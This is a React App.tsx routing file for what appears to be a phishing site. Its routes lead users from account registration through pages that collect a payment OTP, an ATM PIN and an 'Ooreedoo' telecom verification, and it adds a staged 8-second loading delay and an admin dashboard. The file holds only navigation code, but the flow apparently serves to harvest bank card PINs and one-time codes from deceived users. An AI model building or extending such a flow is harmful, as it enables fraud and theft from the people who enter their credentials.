import { useState, useEffect } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import { RegistrationProvider } from "@/contexts/RegistrationContext";
import LoadingScreen from "@/components/LoadingScreen";
import Welcome from "./pages/Welcome";
import Index from "./pages/Index";
import PersonalInfo from "./pages/PersonalInfo";
import Login from "./pages/Login";
import Password from "./pages/Password";
import RegistrationComplete from "./pages/RegistrationComplete";
import PaymentOTP from "./pages/PaymentOTP";
import OTPVerification from "./pages/OTPVerification";
import ATMPin from "./pages/ATMPin";
import ATMLoading from "./pages/ATMLoading";
import Success from "./pages/Success";
import OoreedooVerification from "./pages/OoreedooVerification";
import ForgotPassword from "./pages/ForgotPassword";
import EmailVerification from "./pages/EmailVerification";
import ProcessingRequest from "./pages/ProcessingRequest";
import AccountCreation from "./pages/AccountCreation";
import AdminDashboard from "./pages/AdminDashboard";
import MemeImage from "./pages/MemeImage";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const AppContent = () => {
  const location = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [previousPath, setPreviousPath] = useState<string>("");

  useEffect(() => {
    setIsLoading(true);
    
    // Check if navigating from registration-complete to payment-otp
    const isPaymentToOTP = previousPath === "/registration-complete" && location.pathname === "/payment-otp";
    const loadingDuration = isPaymentToOTP ? 8000 : 1500; // 8 seconds for payment to OTP, 1.5 seconds for others
    
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, loadingDuration);

    // Update previous path after navigation
    setPreviousPath(location.pathname);

    return () => clearTimeout(timer);
  }, [location.pathname]);

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <Routes>
      <Route path="/" element={<Welcome />} />
      <Route path="/register" element={<Index />} />
      <Route path="/login" element={<Login />} />
      <Route path="/account-creation" element={<AccountCreation />} />
      <Route path="/personal-info" element={<PersonalInfo />} />
      <Route path="/password" element={<Password />} />
      <Route path="/registration-complete" element={<RegistrationComplete />} />
      <Route path="/payment-otp" element={<PaymentOTP />} />
      <Route path="/atm-pin" element={<ATMPin />} />
      <Route path="/atm-loading" element={<ATMLoading />} />
      <Route path="/ooredoo-verification" element={<OoreedooVerification />} />
      <Route path="/otp-verification" element={<OTPVerification />} />
      <Route path="/success" element={<Success />} />
      <Route path="/forgot-password" element={<ForgotPassword />} />
      <Route path="/email-verification" element={<EmailVerification />} />
      <Route path="/processing-request" element={<ProcessingRequest />} />
      <Route path="/admin-dashboard" element={<AdminDashboard />} />
      <Route path="/meme" element={<MemeImage />} />
      {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <RegistrationProvider>
          <AppContent />
        </RegistrationProvider>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
